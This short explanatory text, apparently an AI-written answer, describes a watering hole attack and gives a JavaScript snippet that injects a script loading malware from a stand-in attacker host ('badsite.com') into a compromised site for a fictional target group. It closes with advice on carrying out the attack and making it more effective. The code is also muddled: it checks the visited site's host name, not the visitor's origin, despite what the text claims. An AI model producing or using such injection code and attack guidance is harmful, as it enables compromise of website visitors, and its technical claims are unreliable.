A Watering Hole attack targets a specific group or organization by infecting websites that the target group is known to visit. The attacker compromises a legitimate website, injects malicious code into it, and then waits for members of the target group to visit the website, unknowingly downloading the malware. Here's a JavaScript example of a simple Watering Hole attack for a fictional target, "TechExperts":
```javascript
// Check if the visitor is from the target group
const isTargetGroup = (window.location.host.includes("techexperts.org"));

// Malicious code to be executed on the compromised website
const maliciousCode = () => {
  // Create a deobfuscated script tag to evade security checks
  const scriptTag = document.createElement('script');
  scriptTag.text = `
    (function() {
      var x = document.createElement('script');
      x.src = 'https://badsite.com/malware.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(x);
    })();
  `;
  document.body.appendChild(scriptTag);
};

// Execute the malicious code if the visitor is from the target group
if (isTargetGroup) {
  maliciousCode();
}
```
This code checks if the visitor is from the TechExperts organization by searching for the string "techexperts.org" in the current website's host name. If the visitor is from the target group, the script creates a new script tag and appends it to the page, loading the malicious JavaScript from the attacker's server.

To perform this attack, the attacker needs to compromise a website frequently visited by members of the target group, insert the malicious code, and wait for victims to visit the site. This attack can be made more effective by selecting a popular website or one with a low security posture.
